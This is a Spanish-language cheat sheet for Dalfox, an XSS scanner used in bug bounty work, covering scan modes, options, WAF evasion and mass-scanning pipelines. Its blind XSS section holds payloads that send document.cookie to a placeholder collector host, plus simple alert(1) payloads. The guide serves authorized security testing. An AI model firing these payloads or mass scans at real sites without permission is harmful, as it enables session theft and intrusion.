# 🦊 Dalfox - Framework de escaneo XSS

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

```
  ██████╗  █████╗ ██╗     ███████╗ ██████╗ ██╗  ██╗
  ██╔══██╗██╔══██╗██║     ██╔════╝██╔═══██╗╚██╗██╔╝
  ██║  ██║███████║██║     █████╗  ██║   ██║ ╚███╔╝ 
  ██║  ██║██╔══██║██║     ██╔══╝  ██║   ██║ ██╔██╗ 
  ██████╔╝██║  ██║███████╗██║     ╚██████╔╝██╔╝ ██╗
  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝
         Potente herramienta de análisis y escaneo XSS
```

<p align="center">
  <img src="https://img.shields.io/badge/Dalfox-XSS_Scanner-blue?style=for-the-badge" alt="Dalfox">
  <img src="https://img.shields.io/badge/Reflected_XSS-green?style=for-the-badge" alt="Reflejado">
  <img src="https://img.shields.io/badge/Bug_Bounty-red?style=for-the-badge" alt="Bug Bounty"><br>
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

---

## 📋 Índice

- [¿Qué es Dalfox?](#-qué-es-dalfox)
- [Instalación](#-instalación)
- [Uso básico](#-uso-básico)
- [Modos de escaneo](#-modos-de-escaneo)
- [Opciones avanzadas](#-opciones-avanzadas)
- [XSS ciego](#-xss-ciego)
- [Referencia rápida](#-referencia-rápida)

---

## 🎯 ¿Qué es Dalfox?

**Dalfox** es una herramienta potente de análisis y escaneo de vulnerabilidades XSS:

- 🔍 **Análisis de parámetros** - Encontrar puntos de reflexión
- 🎯 **Detección de XSS** - Reflejado y basado en DOM
- 💉 **XSS ciego** - Pruebas fuera de banda (OOB)
- ⚡ **Rápido** - Desarrollado en Go, con alta concurrencia

### ¿Por qué utilizar Dalfox?

| Función | Ventaja |
|---------|---------|
| Análisis inteligente | Payloads adaptados al contexto |
| Detección de WAF | Elusión de WAF habituales |
| XSS ciego | Compatible con interacciones fuera de banda |
| Modo de descubrimiento de parámetros (mining) | Buscar parámetros en JavaScript |

---

> **Compatibilidad:** el original utiliza comandos y opciones de Dalfox v2. Conservamos esa sintaxis; comprueba la ayuda de tu versión para las opciones de autenticación, salida y modos disponibles.

## 🚀 Instalación

```bash
# Instalar con Go (recomendado)
go install github.com/hahwul/dalfox/v2@latest

# Homebrew (macOS)
brew install dalfox

# Snap (Linux)
sudo snap install dalfox

# Comprobar la instalación
dalfox version
```

---

## 📖 Uso básico

### Una sola URL

```bash
# Escaneo básico
dalfox url https://example.com/search?q=test

# Guardar la salida
dalfox url https://example.com/search?q=test -o results.txt
```

### Varias URL

```bash
# Desde la entrada estándar
cat urls.txt | dalfox pipe

# Desde un archivo
dalfox file urls.txt

# Con paralelismo
cat urls.txt | dalfox pipe -w 50
```

### Modo silencioso

```bash
# Mostrar solo vulnerabilidades
dalfox url https://example.com/search?q=test --silence

# Sin colores
dalfox url https://example.com/search?q=test --no-color
```

---

## 🔎 Modos de escaneo

### Modo URL

```bash
# Escanear una sola URL
dalfox url https://example.com/page?param=value

# Escanear con datos
dalfox url https://example.com/page?param=value -d "post_param=value"
```

### Modo pipe (entrada estándar)

```bash
# Desde la entrada estándar
echo "https://example.com/search?q=test" | dalfox pipe

# Varias URL
cat urls_with_params.txt | dalfox pipe
```

### Modo file (archivo)

```bash
# Desde un archivo
dalfox file urls.txt

# Con archivo de salida
dalfox file urls.txt -o results.txt
```

### Modo server (servidor)

```bash
# Iniciar el servidor de API
dalfox server

# Puerto personalizado
dalfox server -p 8080

# A continuación, enviar peticiones:
# POST http://localhost:8090/scan
# {"url": "https://example.com/search?q=test"}
```

---

> **Puerto de la API:** el ejemplo anterior configura `8080`, pero el comentario envía peticiones a `8090`. Deben coincidir con el puerto real del servidor. Consulta el comportamiento de tu versión en la [guía oficial del servidor](https://dalfox.hahwul.com/integrations/server/).

<a id="-opciones-avanzadas"></a>
## ⚙️ Opciones avanzadas

### Cabeceras personalizadas

```bash
# Añadir una cabecera
dalfox url https://example.com/search?q=test -H "Authorization: Bearer token"

# Varias cabeceras
dalfox url https://example.com/search?q=test \
  -H "Cookie: session=abc" \
  -H "X-Forwarded-For: 127.0.0.1"
```

### Cookies y autenticación

```bash
# Con una cookie
dalfox url https://example.com/search?q=test -C "session=abc123"

# Autenticación Basic
dalfox url https://example.com/search?q=test --basic-auth "user:pass"
```

### Payloads personalizados

```bash
# Utilizar un archivo de payloads personalizados
dalfox url https://example.com/search?q=test --custom-payload payloads.txt

# Un único payload personalizado, según el original
dalfox url https://example.com/search?q=test -p '<script>alert(1)</script>'

# Formato de los payloads en el archivo:
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
# <svg onload=alert(1)>
```

> **Corrección de `-p`:** en el escaneo, esta opción selecciona nombres de parámetros; no introduce un payload literal. Se conserva el comando y la fila de referencia del original. Para archivos de payloads, consulta `--custom-payload` y la [guía oficial de parámetros](https://dalfox.hahwul.com/guide/parameters/).

### Formatos de salida

```bash
# Salida JSON
dalfox url https://example.com/search?q=test --format json -o result.json

# Solo vulnerabilidades
dalfox url https://example.com/search?q=test --only-poc
```

### Rendimiento

```bash
# Establecer los workers (paralelismo)
dalfox url https://example.com/search?q=test -w 100

# Tiempo de espera (segundos)
dalfox url https://example.com/search?q=test --timeout 10

# Espera entre peticiones (milisegundos)
dalfox url https://example.com/search?q=test --delay 100
```

### Evasión de WAF

```bash
# Utilizar la elusión de WAF
dalfox url https://example.com/search?q=test --waf-evasion

# Ignorar la identificación, según el original
dalfox url https://example.com/search?q=test --skip-mining
```

> **Corrección de mining:** `--skip-mining` desactiva el descubrimiento adicional de parámetros; no significa «ignorar el fingerprint». Las opciones de WAF cambian según la versión y no garantizan una elusión. Véase la [referencia oficial de CLI](https://github.com/hahwul/dalfox/blob/main/docs/content/reference/cli.md).

### Proxy

```bash
# Proxy HTTP
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080

# Para Burp Suite
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080
```

---

## 💉 XSS ciego

### Uso de un payload de XSS ciego

```bash
# Con XSS Hunter / Burp Collaborator
dalfox url https://example.com/form?input=test -b "https://your.xss.ht"

# La opción -b añade callbacks de XSS ciego
```

### XSS ciego con un payload personalizado

```bash
# Payload personalizado de XSS ciego
dalfox url https://example.com/form?name=test \
  --blind "https://your.xss.ht" \
  --custom-payload blind_payloads.txt
```

### Ejemplos de payloads de XSS ciego

```html
"><img src=x onerror="fetch('https://your.xss.ht/'+document.cookie)">
"><script src="https://your.xss.ht"></script>
'"><script>new Image().src="https://your.xss.ht/?c="+document.cookie</script>
```

---

## 📊 Referencia rápida

### Comandos básicos

| Comando | Descripción |
|---------|-------------|
| `dalfox url URL` | Escanear una URL |
| `dalfox file file.txt` | Escanear desde un archivo |
| `cat urls \| dalfox pipe` | Escanear desde la entrada estándar |
| `dalfox server` | Iniciar el servidor de API |

### Opciones esenciales

| Opción | Descripción |
|------|-------------|
| `-o file.txt` | Archivo de salida |
| `-w 50` | Workers (paralelismo) |
| `-H "Header: value"` | Cabecera personalizada |
| `-C "cookie=value"` | Cookie |
| `-b "url"` | Callback de XSS ciego |
| `--proxy URL` | Proxy HTTP |
| `--timeout 10` | Tiempo de espera por petición |

### Opciones de salida

| Opción | Descripción |
|------|-------------|
| `--format json` | Salida JSON |
| `--only-poc` | Mostrar solo pruebas de concepto |
| `--silence` | Modo silencioso |
| `--no-color` | Salida sin colores |

### Opciones de payloads

| Opción | Descripción |
|------|-------------|
| `-p "payload"` | Payload personalizado |
| `--custom-payload file` | Archivo de payloads |
| `--waf-evasion` | Modo de elusión de WAF |

---

## 🎯 Flujos de trabajo de bug bounty

### Escaneo básico de XSS

```bash
# Escaneo rápido
dalfox url "https://target.com/search?q=test" --silence
```

### Desde una recopilación de URL

```bash
# GAU + Dalfox
gau target.com | grep "=" | dalfox pipe -o xss_results.txt

# Wayback + Dalfox
echo target.com | waybackurls | grep "=" | dalfox pipe --silence
```

### Escaneo masivo

```bash
# Escanear todos los parámetros de las URL
cat all_urls.txt | grep "?" | dalfox pipe -w 100 -o found_xss.txt
```

### Con patrones GF

```bash
# Con GF + Dalfox
gau target.com | gf xss | dalfox pipe --silence

# Con filtrado mediante httpx
gau target.com | gf xss | httpx -silent | dalfox pipe
```

### Escaneo autenticado

```bash
# Con una sesión
dalfox url "https://target.com/dashboard?search=test" \
  -C "session=abc123" \
  -H "Authorization: Bearer token" \
  -o auth_xss.txt
```

### Cadena completa de herramientas

```bash
# Cadena completa de búsqueda de XSS
subfinder -d target.com -silent | \
  httpx -silent | \
  gau | \
  gf xss | \
  uro | \
  dalfox pipe -w 50 --silence -o xss_vulnerabilities.txt
```

### Campaña de XSS ciego

```bash
# XSS ciego masivo
cat contact_forms.txt | dalfox pipe -b "https://your.xss.ht" --silence

# Específicamente para formularios de entrada
cat form_urls.txt | dalfox pipe \
  -b "https://your.xss.ht" \
  --custom-payload blind_xss.txt \
  -w 10
```

---

## 💡 Consejos para buscar XSS

1. **Revisa todos los parámetros** - También los menos evidentes
2. **Prueba distintos contextos** - HTML, JavaScript y atributos
3. **Utiliza XSS ciego** - Para paneles de administración y registros
4. **Encadena con redirecciones abiertas** - Para aumentar el impacto cuando sea posible
5. **Revisa las cabeceras de respuesta** - CSP, X-XSS-Protection
6. **Prueba los parámetros POST** - A menudo se pasan por alto

### Puntos habituales de inyección XSS

```
- Campos de búsqueda
- Campos del perfil de usuario
- Comentarios y opiniones
- Parámetros de URL
- Cabeceras HTTP (Referer, User-Agent)
- Nombres de los archivos subidos
- Mensajes de error
```

> **Interpretación de resultados:** la reflexión de un payload y una respuesta HTTP correcta no bastan para demostrar ejecución de JavaScript. El contexto, la codificación, CSP y el comportamiento del navegador determinan la explotación. Los ejemplos de cookies solo pueden acceder a las que JavaScript tenga permitido leer.

### Payloads según el contexto

| Contexto | Payload |
|---------|---------|
| HTML | `<script>alert(1)</script>` |
| Atributo | `" onmouseover="alert(1)"` |
| JavaScript | `';alert(1)//` |
| URL | `javascript:alert(1)` |

---

## 📚 Recursos

- [Dalfox GitHub](https://github.com/hahwul/dalfox)
- [Payloads XSS](https://github.com/payloadbox/xss-payload-list)

### Guías rápidas relacionadas
- [Metodología de bug bounty](../../Bug-Bounty-Methodology/translations/README.es.md)
- [Payloads XSS](../../Payloads/translations/XSS.es.md)
- [Burp Suite](../../Burp-Suite/translations/README.es.md)

---

<p align="center">
  <b>🦊 ¡Encuentra vulnerabilidades XSS!</b><br>
  <i>Dalfox - El aliado de quienes buscan XSS</i>
</p>
